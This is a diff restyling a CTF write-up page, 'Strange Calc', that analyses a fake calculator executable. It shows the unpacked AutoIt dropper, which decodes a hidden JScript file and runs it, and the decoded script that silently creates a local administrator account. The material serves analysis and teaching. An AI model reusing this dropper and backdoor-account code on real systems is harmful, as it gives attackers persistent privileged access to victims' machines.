@@ -1,285 +1,292 @@
 <!DOCTYPE html>
 <html lang="en">
+<link href="https://cdn.jsdelivr.net/npm/prismjs@1.29.0/themes/prism-tomorrow.css" rel="stylesheet" />
+<script src="../assets/js/prism.js"></script>
+<script src="../assets/js/prism-bash.min.js"></script>
+<script src="../assets/js/prism-powershell.min.js"></script>
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Strange Calc</title>
-    <style>
-        body {
-            font-family: Arial, sans-serif;
-            background-color: #1e1e1e;
-            color: #f0f0f0;
-            margin: 0;
-            padding: 20px;
-        }
-        .header {
-            background-color: #333;
-            padding: 10px;
-            text-align: center;
-        }
-        .header a {
-            color: #f0f0f0;
-            text-decoration: none;
-            margin: 0 15px;
-        }
-        .header a:hover {
-            text-decoration: underline;
-        }
-
-        .container {
-            max-width: 1200px;
-            margin: 20px auto;
-            padding: 20px;
-            background-color: #2a2a2a;
-            border-radius: 8px;
-            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1);
-            color: #e0e0e0;
-            font-family: 'Arial', sans-serif;
-        }
-      
-        .code-box {
-            background-color: #1a1a1a;
-            padding: 15px;
-            border-radius: 6px;
-            border: 1px solid #333;
-            margin: 15px 0;
-            overflow: hidden;
-        }
-
-        .code-box pre {
-            margin: 0;
-            color: #cfcfcf;
-            font-family: 'Courier New', Courier, monospace;
-            font-size: 1em;
-        }
-
-        .image-box {
-            text-align: center;
-            margin: 20px 0;
-        }
-
-        .image-box img {
-            max-width: 100%;
-            height: auto;
-            border-radius: 6px;
-            box-shadow: 0 2px 8px rgba(0, 0, 0, 0.3);
-        }
-
-        p {
-            line-height: 1.6;
-            font-size: 1.1em;
-            color: #d3d3d3; 
-        }
-        
-        h1, h2 {
-            color: #f0f0f0;
-        }
-        ul {
-            list-style-type: none;
-            padding: 0;
-        }
-        ul li {
-            margin: 10px 0;
-        }
-        ul li a {
-            text-decoration: none;
-            color: #9cdbff;
-            font-size: 1.2rem;
-        }
-        ul li a:hover {
-            text-decoration: underline;
-        }
-        .command {
-            background-color: #333; 
-            color: #fff;          
-            padding: 10px;        
-            margin-bottom: 10px; 
-        }
-
-    </style>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>CTF Writeup</title>
+<style>
+:root {
+  --bg:#0e0f13; --fg:#e6e6e6; --muted:#9aa0a6;
+  --accent:#7dd3fc; --edge:#3b4252; --node:#a78bfa;
+  --badge:#1f2937; --highlight:#facc15;
+  --color-code-background:#111318; --color-link:#7dd3fc;
+  --highlight-foreground:#60a5fa; --highlight-nav:#7dd3fc33;
+  --cursor-pointer:pointer; --global-theme:#f59e0b;
+}
+.home-btn { text-decoration: none; color: var(--accent); background: var(--badge); padding: 6px 12px; border-radius: 6px; border: 1px solid var(--edge); font-weight: bold; transition: 0.3s; }
+.home-btn:hover { background: var(--accent); color: var(--bg); }
+body{margin:0;font-family:ui-sans-serif,system-ui;background:var(--bg);color:var(--fg)}
+header{padding:16px;border-bottom:1px solid #1f2430;display:flex;align-items:center;justify-content:space-between;background:#111318}
+h1{margin:0;font-size:24px}
+.container{display:grid;grid-template-columns:1fr 360px;gap:16px;padding:16px}
+aside{border-left:1px solid #1f2430;padding:16px;overflow-y:auto;background:#111318;box-shadow:-2px 0 8px rgba(0,0,0,0.3)}
+.post{padding:12px;border:1px solid #232838;border-radius:10px;margin-bottom:12px;background:#181b22;box-shadow:0 2px 6px rgba(0,0,0,0.35)}
+.post h4{margin:0 0 6px 0}.post .meta{font-size:12px;color:var(--muted);display:flex;gap:8px;flex-wrap:wrap}
+.badge{font-size:14px;background:var(--badge);padding:6px 10px;margin-right:10px;border-radius:6px;border:1px solid #2b3242}
+.article-entry{margin-bottom:24px}
+.article-entry code,.article-entry kbd{font-family:'JetBrains Mono','Menlo','Monaco','Consolas','monospace';font-size:95%;transition:0.3s;word-break:break-word;background:var(--color-code-background);padding:1px 5px;border-radius:5px;color:var(--color-link)}
+.article-entry pre[class*="language-"]{ background: var(--color-code-background) !important; border-radius:0}
+.article-entry pre code{background:none;text-shadow:none;color:var(--fg);padding:0}
+.article-entry .highlight{overflow:hidden;interpolate-size:allow-keywords}
+.article-entry .highlight.code-closed pre{height:0;opacity:0;overflow:hidden}
+.code-area{width:100%;overflow:hidden;transition:0.3s;border-radius:10px;border:2px solid #232838;background:#111318;margin-bottom:16px}
+.code-figcaption{width:100%;display:flex;justify-content:space-between;height:40px;align-items:center;flex-shrink:0;background:linear-gradient(to right, transparent 0%, var(--bg) 50%, transparent 100%);margin-bottom:10px;padding:0 8px;position:relative}
+.code-left-wrap,.code-right-wrap{display:flex;align-items:center}
+.code-copy,.code-lang,.code-expand{margin:5px; padding-right: 12px; z-index:1;filter:invert(50%);cursor:var(--cursor-pointer);color:#fff;transition:0.3s}
+.code-copy:hover,.code-expand:hover{opacity:.7}
+.code-expand{transform:rotate(0deg)}
+.code-closed .code-expand{transform:rotate(-180deg)!important;transition:0.3s}
+</style>
 </head>
 <body>
-    <div class="header">
-        <h1>Lotus</h1>
-        <a href="../Forensic/index.html">Forensics</a>
-        <a href="../Android/index.html">Android</a>
-        <a href="../Reverse/index.html">Reversing</a>
-    </div>
-    <div class="container">
-        <h1>Strange Calc</h1>
-        <p>Description: I got this new calculator app from my friend! But it’s really weird, for some reason it needs admin permissions to run??</p>
-
-        <span>Using file on calc.exe give us: <span class="command">PE32 executable (GUI) Intel 80386, for MS Windows, UPX compressed, 3 sections</span></span>
-
-        We can see that it is a Windows executable that was compressed using UPX. With that knowledge, we can just unpack using the following command.
-        
-        <div class="code-box">
-            <pre><code>upx -d calc.exe -o unpackcalc.exe</code></pre>
+<header>
+  <a href="../index.html" class="home-btn">Home</a>
+  <h1>Strange Calc</h1>
+  <div id="current-legend"><span class="badge">Forensic</span></div>
+</header>
+<div class="container">
+  <main class="article-entry">
+    <section>
+      <h2>Introduction</h2>
+    </section>
+    <section>
+      <p>Description: I got this new calculator app from my friend! But it’s really weird, for some reason it needs admin permissions to run??</p>
+      <p>Using file on calc.exe give us:</p>
+      <div class="code-area">
+        <div class="code-figcaption">
+          <div class="code-left-wrap"><span class="code-lang">bash</span></div>
+          <div class="code-right-wrap"><span class="code-copy">Copy</span></div>
         </div>
-
-        <p>Once unpacked, I used ghidra but saw nothing at first glance. I used the string command on the executable on can see this weird html code.</p> 
-
-        <div class="code-box">
-            <pre><code>&lt;?xml version="1.0" encoding="UTF-8" standalone="yes"?&gt;
-        &lt;assembly xmlns="urn:schemas-microsoft-com:asm.v1" manifestVersion="1.0"&gt;
-            &lt;assemblyIdentity
-                type="win32"
-                processorArchitecture="*"
-                version="3.0.0.0"
-                name="AutoIt3"
-            /&gt;
-            &lt;description&gt;AutoIt v3&lt;/description&gt;
-            &lt;!-- Identify the application security requirements. --&gt;
-            &lt;trustInfo xmlns="urn:schemas-microsoft-com:asm.v2"&gt;
-                &lt;security&gt;
-                    &lt;requestedPrivileges&gt;
-                        &lt;requestedExecutionLevel
-                            level="asInvoker"
-                            uiAccess="false"
-                        /&gt;
-                    &lt;/requestedPrivileges&gt;
-                &lt;/security&gt;
-            &lt;/trustInfo&gt;
-            &lt;!-- Identify the application dependencies. --&gt;
-            &lt;dependency&gt;
-                &lt;dependentAssembly&gt;
-                    &lt;assemblyIdentity
-                        type="win32"
-                        name="Microsoft.Windows.Common-Controls"
-                        version="6.0.0.0"
-                        language="*"
-                        processorArchitecture="*"
-                        publicKeyToken="6595b64144ccf1df"
-                    /&gt;
-                &lt;/dependentAssembly&gt;
-            &lt;/dependency&gt;
-        &lt;/assembly&gt;
-            </code></pre>
+         <pre><code class="language-bash"> executable (GUI) Intel 80386, for MS Windows, UPX compressed, 3 sections</code></pre>
         </div>
-
-        <p>I discovered that AutoIt3 is a scripting language that can automate GUI commands on windows. I found AutoIt-Ripper that can extract the AutoIt file from the PE. I used <span>autoit-ripper unpackcalc.exe</span> in order to retrieve the AutoIt script that look like this:</p>
-
-        <div class="code-box">
-            <pre><code>; <AUT2EXE VERSION: 3.2.4.9>
-                ; ----------------------------------------------------------------------------
-                ; <AUT2EXE INCLUDE-START: C:\Users\johnh\Desktop\Desktop\otto_calculator.au3>
-                ; ----------------------------------------------------------------------------
-                #NoTrayIcon
-                #Region
-                #AutoIt3Wrapper_Change2CUI=y
-                #EndRegion
-                If Not IsAdmin() Then
-                    MsgBox(16, "Error", "You must have administrator privileges.")
-                    Exit
-                EndIf
-                Local $a = "I0B+XmNRTUFBQT09VyF4XkRrS3hQbWAoYgk3bC5QMSdFRUJOJyggL2FWa0RjRS0JSippV1cuYzdsLlB/eCFwK0AhW2NWK1VMRHRJKzNRKgktbUQsMCc5JH9EUk0rMlZtbW5jSjcta1F1Jy9fZiZMfkVCKmlyMGNXY2tVTn9hcjZgRTh/b2tVRSoneCdaay0wIGJ4OSs2fTB2RSsJTkUjeyd4VC11MHt4J3JKIzFHVVlieCErSVxDLixveGA2IG00bC4vS04rKU92IWJPMisqW38yaTZXRHZcbS5QNCdxaTRAIVcgXit4VE90cHRfeypiCWIwdnRRJkAqeDZScysJTFk0Izguf2wzSS1tRH5re2M2Ul40bE1aVzkrek9gNCNSJnkjJ38yfkx7YzBjbXRtLi9XOSt6WWN0UXEqT2YgKid2Mn5WeHYwUl40bUQvVzluelljNF95I08yICondjJ+cyd2MCBeNGxEO0dOf2JZdjRRJipPMiBiW39mcG1RJ1VPRGJ4TCA2RFdoLzRsLlpLW39gY2JAIUAhICMtYE5AKkAqVyNiaWIwYzQzIEAhNiBWf3hvRDRSRiptMydqWS5yCW8gME1HOjt0Qy47V05uY3ZgJVs4WCpAIUAhVyMtYDNAKkAqeWIjcGtXYDRfZkAhNlJWf1VvRHRPOGJeX3s/RERyeEwgNkRHOjs0bE1aR1t/YGBjVkwmYkAhQCF/KnVzKjgpRCtERU1VUDFSZEUoL08uYnhvdlR+VCM4N0MuUHMncjRub3JVLHYqYyxSLQlNMW81YiwJSklSZmAiMXdgXUJ2dWIsO15xUiZ7MlMuT2YwL3YoLFtAIShjJiJ6Un8hSX5xS00tVXwneG54OUVpN2wufgknbGNoKmktbE1+Sycscnh/WVAhL38uUGRXXmxeYltoYnhra09EbVlXTX5FXwlfclAmbFtbcn5FeH9PUF5XXkNeb0RHO2FQQ05zcglrZEREbVlXTS8sSlcxbHNiOTpyVWIvWU1DWUtEUEpDW05yfnJtQ1ZeIH82bkpZSVxtRH4ye3grQX56bU9rN25vcjhOKzFZYEV/VV5EYndPUlV0bnNeQiNwV1dNYFxtLn47eyFwO0AhVyBzf3hMWTRSRnA7UVEqCXcgXSF4Y1ddNVl+VEIwbVYvfyMpMlIiRVVgSyQrREJGfjZDVmsrI3A0UkFCQUE9PV4jfkA="
-                Local $b = x($a)
-                Local $c = r(4) & r(2) & r(3) & r(1) & ".jse"
-                Func r($aa)
-                    Local $zz = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
-                    Local $s = ""
-                    For $i = 1 To $aa
-                        $s &= StringMid($zz, Random(1, StringLen($zz), 1), 1)
-                    Next
-                    Return $s
-                EndFunc
-                Local $d = FileOpen($c, 2)
-                If $d = -1 Then
-                    MsgBox(16, "Error", "Failed to open the calculator.")
-                    Exit
-                EndIf
-                FileWrite($d, $b)
-                FileClose($d)
-                FileSetAttrib($c, "+H")
-                FileSetAttrib($c, "+S")
-                Func x($e)
-                    Local $f = DllStructCreate("dword")
-                    DllCall("crypt32.dll", "int", "CryptStringToBinaryA", _
-                        "str", $e, _
-                        "dword", StringLen($e), _
-                        "dword", 1, _
-                        "ptr", 0, _
-                        "ptr", DllStructGetPtr($f), _
-                        "ptr", 0, _
-                        "ptr", 0)
-                    Local $g = DllStructCreate("byte[" & DllStructGetData($f, 1) & "]")
-                    DllCall("crypt32.dll", "int", "CryptStringToBinaryA", _
-                        "str", $e, _
-                        "dword", StringLen($e), _
-                        "dword", 1, _
-                        "ptr", DllStructGetPtr($g), _
-                        "ptr", DllStructGetPtr($f), _
-                        "ptr", 0, _
-                        "ptr", 0)
-                    Return BinaryToString(DllStructGetData($g, 1))
-                EndFunc
-                $o = ObjCreate("MSScriptControl.ScriptControl")
-                $o.Language = "JScript"
-                $p = "new ActiveXObject('WScript.Shell').Run('wscript.exe " & $c & "',1,false);"
-                $o.ExecuteStatement($p)
-                ; ----------------------------------------------------------------------------
-                ; <AUT2EXE INCLUDE-END: C:\Users\johnh\Desktop\Desktop\otto_calculator.au3>
-                ; ----------------------------------------------------------------------------
-                
-                </code></pre>
+      <p>With a bit of search we can see that it is a Windows executable that was compressed using UPX, it is a "free, secure, portable, extendable, high-performance" executable packer. With that knowledge, we can just unpack using the following command.</p>
+      <div class="code-area">
+        <div class="code-figcaption">
+          <div class="code-left-wrap"><span class="code-lang">bash</span></div>
+          <div class="code-right-wrap"><span class="code-copy">Copy</span></div>
         </div>
+        <pre><code class="language-bash"> upx -d calc.exe -o unpackcalc.exe </code></pre>
+      </div>
+    </section>
+    <p>Once unpacked, I used ghidra but saw nothing at first glance. I used the string command on the executable on saw this weird html code.</p>
+    <section>
+      <div class="code-area">
+        <div class="code-figcaption">
+          <div class="code-left-wrap"><span class="code-lang">bash</span></div>
+          <div class="code-right-wrap"><span class="code-copy">Copy</span></div>
+        </div>
+        <pre><code class="language-powershell"> &lt;?xml version="1.0" encoding="UTF-8" standalone="yes"?&gt;
+  &lt;assembly xmlns="urn:schemas-microsoft-com:asm.v1" manifestVersion="1.0"&gt;
+      &lt;assemblyIdentity
+          type="win32"
+          processorArchitecture="*"
+          version="3.0.0.0"
+          name="AutoIt3"
+      /&gt;
+      &lt;description&gt;AutoIt v3&lt;/description&gt;
+      &lt;!-- Identify the application security requirements. --&gt;
+      &lt;trustInfo xmlns="urn:schemas-microsoft-com:asm.v2"&gt;
+          &lt;security&gt;
+              &lt;requestedPrivileges&gt;
+                  &lt;requestedExecutionLevel
+                      level="asInvoker"
+                      uiAccess="false"
+                  /&gt;
+              &lt;/requestedPrivileges&gt;
+          &lt;/security&gt;
+      &lt;/trustInfo&gt;
+      &lt;!-- Identify the application dependencies. --&gt;
+      &lt;dependency&gt;
+          &lt;dependentAssembly&gt;
+              &lt;assemblyIdentity
+                  type="win32"
+                  name="Microsoft.Windows.Common-Controls"
+                  version="6.0.0.0"
+                  language="*"
+                  processorArchitecture="*"
+                  publicKeyToken="6595b64144ccf1df"
+              /&gt;
+          &lt;/dependentAssembly&gt;
+      &lt;/dependency&gt;
+  &lt;/assembly&gt;</code></pre>
+      </div>
 
-        <p>Their is a weird and very long base64 encoded string, using cyber chef we can convert the Local $a variable using "From Base64" and "Microsoft Script Decoder"</p>
+      <p>I discovered that AutoIt3 is a scripting language that can automate GUI commands on windows.
+         With that knoweldge I searched for a way to extract the code and found AutoIt-Ripper that can extract the full AutoIt file using the PE (Portable Executable).</p><p>
+          I used <span>autoit-ripper unpackcalc.exe</span> in order to retrieve the AutoIt script, here is what it looks like once it is unpacked:</p>
+    </section>
+    <section>
+      <div class="code-area">
+        <div class="code-figcaption">
+          <div class="code-left-wrap"><span class="code-lang">bash</span></div>
+          <div class="code-right-wrap"><span class="code-copy">Copy</span></div>
+        </div>
+        <pre><code class="language-powershell">; <AUT2EXE VERSION: 3.2.4.9>
+  ; ----------------------------------------------------------------------------
+  ; AUT2EXE INCLUDE-START: C:\Users\johnh\Desktop\Desktop\otto_calculator.au3
+  ; ----------------------------------------------------------------------------
+  #NoTrayIcon
+  #Region
+  #AutoIt3Wrapper_Change2CUI=y
+  #EndRegion
+  If Not IsAdmin() Then
+      MsgBox(16, "Error", "You must have administrator privileges.")
+      Exit
+  EndIf
+  Local $a = "I0B+XmNRTUFBQT09VyF4XkRrS3hQbWAoYgk3bC5QMSdFRUJOJyggL2FWa0RjRS0JSippV1cuY \
+  zdsLlB/eCFwK0AhW2NWK1VMRHRJKzNRKgktbUQsMCc5JH9EUk0rMlZtbW5jSjcta1F1Jy9fZiZMfkVCKmlyMG \
+  NXY2tVTn9hcjZgRTh/b2tVRSoneCdaay0wIGJ4OSs2fTB2RSsJTkUjeyd4VC11MHt4J3JKIzFHVVlieCErSVx \
+  DLixveGA2IG00bC4vS04rKU92IWJPMisqW38yaTZXRHZcbS5QNCdxaTRAIVcgXit4VE90cHRfeypiCWIwdnRR \
+  JkAqeDZScysJTFk0Izguf2wzSS1tRH5re2M2Ul40bE1aVzkrek9gNCNSJnkjJ38yfkx7YzBjbXRtLi9XOSt6W \
+  WN0UXEqT2YgKid2Mn5WeHYwUl40bUQvVzluelljNF95I08yICondjJ+cyd2MCBeNGxEO0dOf2JZdjRRJipPMi \
+  BiW39mcG1RJ1VPRGJ4TCA2RFdoLzRsLlpLW39gY2JAIUAhICMtYE5AKkAqVyNiaWIwYzQzIEAhNiBWf3hvRDR \
+  SRiptMydqWS5yCW8gME1HOjt0Qy47V05uY3ZgJVs4WCpAIUAhVyMtYDNAKkAqeWIjcGtXYDRfZkAhNlJWf1Vv \
+  RHRPOGJeX3s/RERyeEwgNkRHOjs0bE1aR1t/YGBjVkwmYkAhQCF/KnVzKjgpRCtERU1VUDFSZEUoL08uYnhvd \
+  lR+VCM4N0MuUHMncjRub3JVLHYqYyxSLQlNMW81YiwJSklSZmAiMXdgXUJ2dWIsO15xUiZ7MlMuT2YwL3YoLF \
+  tAIShjJiJ6Un8hSX5xS00tVXwneG54OUVpN2wufgknbGNoKmktbE1+Sycscnh/WVAhL38uUGRXXmxeYltoYnh \
+  ra09EbVlXTX5FXwlfclAmbFtbcn5FeH9PUF5XXkNeb0RHO2FQQ05zcglrZEREbVlXTS8sSlcxbHNiOTpyVWIv \
+  WU1DWUtEUEpDW05yfnJtQ1ZeIH82bkpZSVxtRH4ye3grQX56bU9rN25vcjhOKzFZYEV/VV5EYndPUlV0bnNeQ \
+  iNwV1dNYFxtLn47eyFwO0AhVyBzf3hMWTRSRnA7UVEqCXcgXSF4Y1ddNVl+VEIwbVYvfyMpMlIiRVVgSyQrRE \
+  JGfjZDVmsrI3A0UkFCQUE9PV4jfkA="
+           
+  Local $b = x($a)
+  Local $c = r(4) & r(2) & r(3) & r(1) & ".jse"
+  Func r($aa)
+      Local $zz = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
+      Local $s = ""
+      For $i = 1 To $aa
+          $s &= StringMid($zz, Random(1, StringLen($zz), 1), 1)
+      Next
+      Return $s
+  EndFunc
+  Local $d = FileOpen($c, 2)
+  If $d = -1 Then
+      MsgBox(16, "Error", "Failed to open the calculator.")
+      Exit
+  EndIf
+  FileWrite($d, $b)
+  FileClose($d)
+  FileSetAttrib($c, "+H")
+  FileSetAttrib($c, "+S")
+  Func x($e)
+      Local $f = DllStructCreate("dword")
+      DllCall("crypt32.dll", "int", "CryptStringToBinaryA", _
+          "str", $e, _
+          "dword", StringLen($e), _
+          "dword", 1, _
+          "ptr", 0, _
+          "ptr", DllStructGetPtr($f), _
+          "ptr", 0, _
+          "ptr", 0)
+      Local $g = DllStructCreate("byte[" & DllStructGetData($f, 1) & "]")
+      DllCall("crypt32.dll", "int", "CryptStringToBinaryA", _
+          "str", $e, _
+          "dword", StringLen($e), _
+          "dword", 1, _
+          "ptr", DllStructGetPtr($g), _
+          "ptr", DllStructGetPtr($f), _
+          "ptr", 0, _
+          "ptr", 0)
+      Return BinaryToString(DllStructGetData($g, 1))
+  EndFunc
+  $o = ObjCreate("MSScriptControl.ScriptControl")
+  $o.Language = "JScript"
+  $p = "new ActiveXObject('WScript.Shell').Run('wscript.exe " & $c & "',1,false);"
+  $o.ExecuteStatement($p)
+  ; ----------------------------------------------------------------------------
+  ; AUT2EXE INCLUDE-END: C:\Users\johnh\Desktop\Desktop\otto_calculator.au3
+  ; ----------------------------------------------------------------------------</code></pre>
+      </div>
+       <p>Their is a weird and very long base64 encoded string, using cyber chef we can convert the Local $a variable using "From Base64" and "Microsoft Script Decoder"</p>
 
         It give us this obfuscated script: 
-        <div class="code-box">
-            <pre><code>
-                function a(b) {
-                    var c = '',
-                      d = b.split('\n')
-                    for (var e = 0; e < d.length; e++) {
-                      var f = d[e].replace(/^\s+|\s+$/g, '')
-                      if (f.indexOf('begin') === 0 || f.indexOf('end') === 0 || f === '') {
-                        continue
-                      }
-                      var g = (f.charCodeAt(0) - 32) & 63
-                      for (var h = 1; h < f.length; h += 4) {
-                        if (h + 3 >= f.length) {
-                          break
-                        }
-                        var i = (f.charCodeAt(h) - 32) & 63,
-                          j = (f.charCodeAt(h + 1) - 32) & 63,
-                          k = (f.charCodeAt(h + 2) - 32) & 63,
-                          l = (f.charCodeAt(h + 3) - 32) & 63
-                        c += String.fromCharCode((i << 2) | (j >> 4))
-                        if (h + 2 < f.length - 1) {
-                          c += String.fromCharCode(((j & 15) << 4) | (k >> 2))
-                        }
-                        if (h + 3 < f.length - 1) {
-                          c += String.fromCharCode(((k & 3) << 6) | l)
-                        }
-                      }
-                    }
-                    return c.substring(0, g)
-                  }
-                  var m =
-                    'begin 644 -\nG9FQA9WLY.3(R9F(R,6%A9C$W-3=E,V9D8C(X9#<X.3!A-60Y,WT*\n`\nend'
-                  var n = a(m)
-                  var o = [
-                    'net user LocalAdministrator ' + n + ' /add',
-                    'net localgroup administrators LocalAdministrator /add',
-                    'calc.exe',
-                  ]
-                  var p = new ActiveXObject('WScript.Shell')
-                  for (var q = 0; q < o.length - 1; q++) {
-                    p.Run(o[q], 0, false)
-                  }
-                  p.Run(o[2], 1, false)
-                  
-            </code></pre>   
+    </section>
+
+    <section>
+      <div class="code-area">
+        <div class="code-figcaption">
+          <div class="code-left-wrap"><span class="code-lang">bash</span></div>
+          <div class="code-right-wrap"><span class="code-copy">Copy</span></div>
         </div>
-
-        The script tries to create a new local administratator, the password of that admnistrator is an UUEncoded string. Once decrypted it give use the flag.
-
-        <div class="image-box">
-            <img src="../assets/images/calcSolveUUEncodedString.png" alt="Flag">
-        </div>
-
+        <pre><code class="language-powershell">
+  function a(b) {
+    var c = '',
+      d = b.split('\n')
+    for (var e = 0; e &lt; d.length; e++) {
+      var f = d[e].replace(/^\s+|\s+$/g, '')
+      if (f.indexOf('begin') === 0 || f.indexOf('end') === 0 || f === '') {
+        continue
+      }
+      var g = (f.charCodeAt(0) - 32) &amp; 63
+      for (var h = 1; h &lt; f.length; h += 4) {
+        if (h + 3 &gt;= f.length) {
+          break
+        }
+        var i = (f.charCodeAt(h) - 32) &amp; 63,
+          j = (f.charCodeAt(h + 1) - 32) &amp; 63,
+          k = (f.charCodeAt(h + 2) - 32) &amp; 63,
+          l = (f.charCodeAt(h + 3) - 32) &amp; 63
+        c += String.fromCharCode((i &lt;&lt; 2) | (j &gt;&gt; 4))
+        if (h + 2 &lt; f.length - 1) {
+          c += String.fromCharCode(((j &amp; 15) &lt;&lt; 4) | (k &gt;&gt; 2))
+        }
+        if (h + 3 &lt; f.length - 1) {
+          c += String.fromCharCode(((k &amp; 3) &lt;&lt; 6) | l)
+        }
+      }
+    }
+    return c.substring(0, g)
+  }
+  var m =
+    'begin 644 -\nG9FQA9WLY.3(R9F(R,6%A9C$W-3=E,V9D8C(X9#&lt;X.3!A-60Y,WT*\n`\nend'
+  var n = a(m)
+  var o = [
+    'net user LocalAdministrator ' + n + ' /add',
+    'net localgroup administrators LocalAdministrator /add',
+    'calc.exe',
+  ]
+  var p = new ActiveXObject('WScript.Shell')
+  for (var q = 0; q &lt; o.length - 1; q++) {
+    p.Run(o[q], 0, false)
+  }
+  p.Run(o[2], 1, false)
+</code></pre>
+      </div>
+    </section>
+     <p>The script tries to create a new local administratator, the password of that admnistrator is an UUEncoded string. Once decrypted it give use the flag.</p>
+      <div>
+        <img src="../assets/images/calcSolveUUEncodedString.png" alt="Flag">
+      </div>
+  </main>
+  <aside>
+    <h3>Related Writeups</h3>
+    <div id="related-posts">
+      <div class="post"><h4><a href="#" style="color: var(--global-theme); text-decoration: none;">Web Basics</a></h4><div class="meta"><span>2024-07-01</span><span class="badge" style="background:#60a5fa22;border-color:#60a5fa55">WEB</span></div></div>
+      <div class="post"><h4><a href="#" style="color: var(--global-theme); text-decoration: none;">JWT None Attack</a></h4><div class="meta"><span>2024-10-01</span><span class="badge" style="background:#60a5fa22;border-color:#60a5fa55">WEB</span></div></div>
     </div>
+  </aside>
+</div>
 </body>
 </html>
+
+
+<script>
+document.querySelectorAll('.code-copy').forEach(btn => {
+  btn.addEventListener('click', () => {
+    const codeArea = btn.closest('.code-area');
+    if (!codeArea) return;
+
+    const codeBlock = codeArea.querySelector('pre code');
+    if (!codeBlock) return;
+
+    navigator.clipboard.writeText(codeBlock.innerText).then(() => {
+      btn.textContent = 'Copied!';
+      setTimeout(() => btn.textContent = 'Copy', 1500);
+    }).catch(err => console.error('Failed to copy text: ', err));
+  });
+});
+</script>
